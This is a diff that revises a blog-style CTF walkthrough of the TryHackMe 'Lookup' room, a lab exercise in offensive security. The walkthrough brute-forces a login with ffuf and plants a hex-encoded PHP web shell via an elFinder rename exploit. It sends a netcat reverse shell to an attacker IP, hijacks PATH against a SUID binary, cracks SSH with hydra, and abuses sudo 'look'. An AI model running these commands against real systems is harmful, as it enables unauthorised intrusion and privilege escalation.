@@ -11,19 +11,19 @@ image:
   path: /assets/img/2025-06-21-TryHackMe-Lookup/main.png
 ---
 
-Hi guys now i'm making <https://tryhackme.com/room/lookup> room.
+Hey everyone, and welcome to my walkthrough for the "Lookup" room on [TryHackMe](https://tryhackme.com/room/lookup)! I had a blast with this one, so grab your favorite beverage, fire up your terminal, and let's get hacking.
 
 ---
 
-## Nmap Scan
+## Nmap Scan: The First Knock
 
-First things first, let's make our lives a little easier. I'm exporting the target IP to an environment variable so I don't have to type it a million times.
+First things first, let's make our lives a little easier. Constantly typing or copy-pasting an IP address is a recipe for typos and frustration. I'm exporting the target IP to an environment variable. Trust me, your future self will thank you.
 
 ```bash
 export IP=10.10.219.52
 ```
 
-With our variable set, it's time to unleash `nmap`:
+With our trusty `$IP` variable ready, it's time to unleash `nmap` to see what doors are open.
 
 ```bash
 ❯ nmap -T4 -n -sC -sV -Pn -p- $IP
@@ -46,24 +46,31 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 68.29 seconds
 ```
 
+The scan reveals two open ports: SSH (22) and HTTP (80). The HTTP title gives us a huge clue: `Did not follow redirect to http://lookup.thm`. This means the web server is configured to respond to a domain name, not just the IP address.
+
+Let's try a quick `curl` just to confirm.
+
 ```bash
 curl $IP
 ```
 
-But there is not output so i go to my browser and type the ip adress
+As expected, we get no output. Time to fire up the browser! Navigating to the IP address confirms the redirect. To make our computer understand what `lookup.thm` is, we need to add it to our `/etc/hosts` file, pointing it to the target's IP.
 
-It seems to be this IP adress is routing me to <http://lookup.thm>. So i add this domain to the `/etc/hosts`
+```text
+# Add this line to your /etc/hosts file
+10.10.219.52    lookup.thm
+```
 
-And i see the website
+With that done, browsing to `http://lookup.thm` finally shows us the website!
 
 ![Desktop View](/assets/img/2025-06-21-TryHackMe-Lookup/photo1.png){: width="646" height="407" }
 
-And i tried password:password but it didnt worked of course.
+Naturally, I tried the classic `admin:admin` combo. It didn't work, of course. That would be too easy! Time to do some proper reconnaissance.
 
-and i tried fuzzing the server with `gobuster`
+Let's fuzz the server for hidden directories and files with `gobuster`.
 
 ```bash
-❯ gobuster dir -w common.txt -u http://lookup.thm/ -x md,js,html,php,py,css,txt -t 50
+❯ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://lookup.thm/ -x md,js,html,php,py,css,txt -t 50
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -89,20 +96,16 @@ Finished
 ===============================================================
 ```
 
-There is login.php we can use brute force this webpage
-
-If ı go the main page and try something I see username and password on http request
+Bingo! `login.php` looks very promising. This is likely where we need to focus our brute-force efforts. By intercepting a login attempt with Burp Suite (or just watching the network tab in the browser), I can see the POST request format:
 
 ```text
 admin=admin&password=admin
 ```
 
-I guess the username is admin so we need to find the password.
-
-I use `ffuf` to get the password.
+My first guess is that the username is `admin`. Let's fire up `ffuf` to find the password. The `-fw 8` flag filters out responses with 8 words, which is the size of the "Invalid credentials" response.
 
 ```bash
-❯ ffuf -w rockyou.txt -X POST -u http://lookup.thm/login.php -d 'username=admin&password=FUZZ' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8"  -fw 8
+❯ ffuf -w /usr/share/wordlists/rockyou.txt -X POST -u http://lookup.thm/login.php -d 'username=admin&password=FUZZ' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8"  -fw 8
 
         /'___\  /'___\           /'___\
        /\ \__/ /\ \__/  __  __  /\ \__/
@@ -116,7 +119,7 @@ ________________________________________________
 
  :: Method           : POST
  :: URL              : http://lookup.thm/login.php
- :: Wordlist         : FUZZ: /home/cilgin/dev/wordlist/rockyou.txt
+ :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
  :: Header           : Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  :: Data             : username=admin&password=FUZZ
  :: Follow redirects : false
@@ -131,14 +134,12 @@ ________________________________________________
 [WARN] Caught keyboard interrupt (Ctrl-C)
 ```
 
-We know the password now
+We found a password! I tried logging in with `admin` and our shiny new password, but... it didn't work. What a plot twist! This means my initial assumption was wrong, and the username is probably not `admin`.
 
-If ı try that password to log in it didnt worked.
-
-So maybe i need to fuzz the users too.
+Time for round two. Let's fuzz the username, using the password we just found. I'll filter out responses with 10 words this time.
 
 ```bash
-❯ ffuf -w xato_net_usernames.txt -X POST -u http://lookup.thm/login.php -d 'username=FUZZ&password=REDACTED' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8"  -fw 10
+❯ ffuf -w /usr/share/wordlists/seclists/Usernames/xato_net_usernames.txt -X POST -u http://lookup.thm/login.php -d 'username=FUZZ&password=REDACTED' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8"  -fw 10
 
         /'___\  /'___\           /'___\
        /\ \__/ /\ \__/  __  __  /\ \__/
@@ -152,7 +153,7 @@ ________________________________________________
 
  :: Method           : POST
  :: URL              : http://lookup.thm/login.php
- :: Wordlist         : FUZZ: /home/cilgin/dev/wordlist/xato_net_usernames.txt
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Usernames/xato_net_usernames.txt
  :: Header           : Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  :: Data             : username=FUZZ&password=REDACTED
  :: Follow redirects : false
@@ -166,57 +167,61 @@ ________________________________________________
 ****                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 74ms]
 ```
 
-I tried logging in with the credentials. And logged in but site routed me to files.lookup.thm
-So i added the domain to the /etc/hosts
+Success! A `302` status code indicates a successful redirect after login. We have our credentials!
 
-and ı finded some web file manager software.
+Logging in with our newly found username and password works, but it immediately routes me to `files.lookup.thm`. Time to edit `/etc/hosts` again!
+
+```text
+# Add this second domain to the line in your /etc/hosts file
+10.10.219.52    lookup.thm files.lookup.thm
+```
+
+After adding the new domain, I'm greeted by a web-based file manager.
 
 ![Desktop View](/assets/img/2025-06-21-TryHackMe-Lookup/photo2.png){: width="525" height="537" }
 
-I firstly tried to check the software version for any vulns
+My first instinct is to check the software version for any known vulnerabilities. A quick search leads me to [this exploit on Exploit-DB](https://www.exploit-db.com/exploits/46481).
 
-And i finded this <https://www.exploit-db.com/exploits/46481>
+The exploit is written in Python 2. Since Python 2 is ancient and can be a pain to get running, I decided to analyze the script and perform the steps manually. It's better practice anyway! The exploit works in a few clever steps:
 
-But it is using python2 so i'm not gonna run that thing. Beacuse it is outdated.
+1.  Upload a regular JPEG file.
+2.  Rename the file to a specially crafted name. This command decodes a hex string into a PHP web shell and names the file `shell.php`... but keeps a `.jpg` extension to fool the server.
+    ```bash
+    $(echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > shell.php).jpg
+    ```
+    The hex decodes to: `<?php system($_GET["c"]); ?>`
+3.  Use the file manager's "rotate image" feature and click "Apply". This triggers a bug where the server re-processes the file, stripping the `.jpg` extension and leaving us with `shell.php`.
+4.  You'll get an error, but that's expected. The magic has already happened.
 
-So i look at the script and maked the things by manual.
-
-1. Upload regular jpeg
-2. Rename the file like this =
-
-```bash
-$(echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > shell.php).jpg
-```
-
-3. Rotate the image and click apply
-4. You will get a error thats fine
-5. Try commands like this
+Now, we can access our shell and execute commands via the `c` parameter in the URL.
 
 ```bash
 ❯ curl -s 'http://files.lookup.thm/elFinder/php/shell.php?c=id'
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-## Gaining Reverse Shell
+We have command execution as the `www-data` user!
 
-I use <https://www.revshells.com/>
+## Gaining a Reverse Shell
+
+A web shell is nice, but a proper interactive reverse shell is way better. I used [revshells.com](https://www.revshells.com/) to generate a payload, URL-encoded it, and sent it with `curl`.
 
 ```bash
-❯ curl -s 'http://files.lookup.thm/elFinder/php/shell.php?c=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.21.206.128%204444%20%3E%2Ftmp%2Ff'
+❯ curl -s 'http://files.lookup.thm/elFinder/php/shell.php?c=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20[YOUR_IP]%204444%20%3E%2Ftmp%2Ff'
 ```
 
-And gained shell.
+And just like that, a shell pops on my `netcat` listener. We're in!
 
 ```bash
 www-data@ip-10-10-219-52:/home$ ls
-ls
 ssm-user
 think
 ubuntu
-www-data@ip-10-10-219-52:/home$
 ```
 
-I runned linpeas in the machine and finded a binary with suid.
+## Privilege Escalation: Part 1 (www-data -> think)
+
+I ran `linpeas.sh` on the machine and it highlighted a very interesting SUID binary: `/usr/sbin/pwm`.
 
 ```bash
 www-data@ip-10-10-219-52:/usr/sbin$ ls -la pwm
@@ -227,65 +232,32 @@ www-data@ip-10-10-219-52:/usr/sbin$ ./pwm
 [-] File /home/www-data/.passwords not found
 ```
 
-It is running id command probably without specifying the path.
+Aha! The program helpfully tells us it's running the `id` command. If the developer didn't use an absolute path (like `/usr/bin/id`), the system will search for `id` in the directories listed in our `PATH` environment variable. This smells like a classic PATH Hijacking opportunity!
 
-We can try to abuse that.
+Let's check `/etc/passwd` to find a user to impersonate. The user `think` with UID/GID 1000 looks like a good target.
 
 ```bash
-www-data@ip-10-10-219-52:/usr/sbin$ cat /etc/passwd
-root:x:0:0:root:/root:/usr/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
-systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
-systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
-messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
-syslog:x:104:110::/home/syslog:/usr/sbin/nologin
-_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
-tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
-uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
-tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
-landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
-pollinate:x:110:1::/var/cache/pollinate:/bin/false
-usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
-sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
-systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
-lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+www-data@ip-10-10-219-52:/usr/sbin$ cat /etc/passwd | grep think
 think:x:1000:1000:,,,:/home/think:/bin/bash
-fwupd-refresh:x:113:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
-mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
-ssm-user:x:1001:1001::/home/ssm-user:/bin/sh
-ubuntu:x:1002:1003:Ubuntu:/home/ubuntu:/bin/bas
 ```
 
-Think users guid is 1000 1000
+Now for the hijack. We'll create our own fake `id` script in `/tmp` (a world-writable directory) that outputs `think`'s user info. Then, we'll prepend `/tmp` to our `PATH`.
 
 ```bash
-export PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin:/bin
-```
+# Set our PATH so the system looks in /tmp first
+export PATH=/tmp:$PATH
 
-```bash
+# Create a malicious 'id' script in /tmp
 echo -e '#!/bin/bash\necho "uid=1000(think) gid=1000(think) groups=33(www-data)"' > /tmp/id
-chmod 777 /tmp/id
+
+# Make it executable
+chmod +x /tmp/id
 ```
 
+Now, when we run the `pwm` binary, it will execute *our* `id` script instead of the real one. It will be tricked into thinking we are the user `think` and will hopefully leak `think`'s passwords.
+
 ```bash
-ww-data@ip-10-10-219-52:/tmp$ /usr/sbin/pwm
+www-data@ip-10-10-219-52:/tmp$ /usr/sbin/pwm
 [!] Running 'id' command to extract the username and user ID (UID)
 [!] ID: think
 jose1006
@@ -293,8 +265,10 @@ jose1006
 jose.2856171
 ```
 
+It worked! The binary dumped a list of passwords. I saved them to a file and used `hydra` to brute-force the SSH login for the user `think`.
+
 ```bash
-❯ hydra -l think -P password.txt ssh://lookup.thm
+❯ hydra -l think -P passwords.txt ssh://lookup.thm
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-27 19:49:26
@@ -303,23 +277,23 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-27 19:49:
 [DATA] attacking ssh://lookup.thm:22/
 [22][ssh] host: lookup.thm   login: think   password: *************
 1 of 1 target successfully completed, 1 valid password found
-[WARNING] Writing restore file because 4 final worker threads did not complete until end.
-[ERROR] 4 targets did not resolve or could not be connected
-[ERROR] 0 target did not complete
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-27 19:49:34
 ```
 
-This gave me ssh password sshed in
+With the password found, I can SSH in as `think` and grab the user flag.
 
 ```bash
 think@ip-10-10-219-52:~$ cat user.txt
 **********************************
 ```
 
+## Privilege Escalation: Part 2 (think -> root)
+
+One flag down, one to go. Let's see what `sudo` privileges we have.
 
 ```bash
-think@ip-10-10-219-52:/home$ sudo -l
-[sudo] password for think: 
+think@ip-10-10-219-52:~$ sudo -l
+[sudo] password for think:
 Matching Defaults entries for think on ip-10-10-219-52:
     env_reset, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -328,30 +302,20 @@ User think may run the following commands on ip-10-10-219-52:
     (ALL) /usr/bin/look
 ```
 
+Interesting. We can run the `/usr/bin/look` command as any user, including root. A quick `man look` shows it's used to find lines in a sorted file. It also uses `/usr/share/dict/words` as a default dictionary. Let's see what happens when we point it at the root flag.
 
 ```bash
-think@ip-10-10-219-52:/home$ sudo look /root/root.txt
+think@ip-10-10-219-52:~$ sudo look /root/root.txt
 look: /usr/share/dict/words: No such file or directory
 ```
 
-```bash
-think@ip-10-10-219-52:/home$ ls /usr/share/dict/words
-ls: cannot access '/usr/share/dict/words': No such file or directory
-think@ip-10-10-219-52:/home$ ls /usr/share/dict/
-think@ip-10-10-219-52:/home$ ls -la /usr/share/dict/
-total 8
-drwxr-xr-x   2 root root 4096 Apr 15  2020 .
-drwxr-xr-x 123 root root 4096 Jul 30  2023 ..
-```
+The command fails because the dictionary file doesn't exist. My first thought was to try creating a malicious `words` file, but a quick check shows we don't have write permissions in `/usr/share/dict/`.
 
-Maybe we can try to add here some bash reverse shell and try to run it.
-
-But we cant beacuse we dont have any write permissions for this directory.
-
-We don't need this
+However, the `look` command takes a search string as its first argument. What if the program doesn't actually *need* the dictionary file if we provide all the necessary arguments? Let's try giving it an empty string as the search term, which should match every line, and point it directly at the root flag.
 
 ```bash
-think@ip-10-10-219-52:/home$ sudo /usr/bin/look '' /root/root.txt
+think@ip-10-10-219-52:~$ sudo /usr/bin/look '' /root/root.txt
 *********************************
 ```
 
+And there it is! The root flag is ours. This was a super fun box with some great, realistic privilege escalation paths. Thanks for reading!
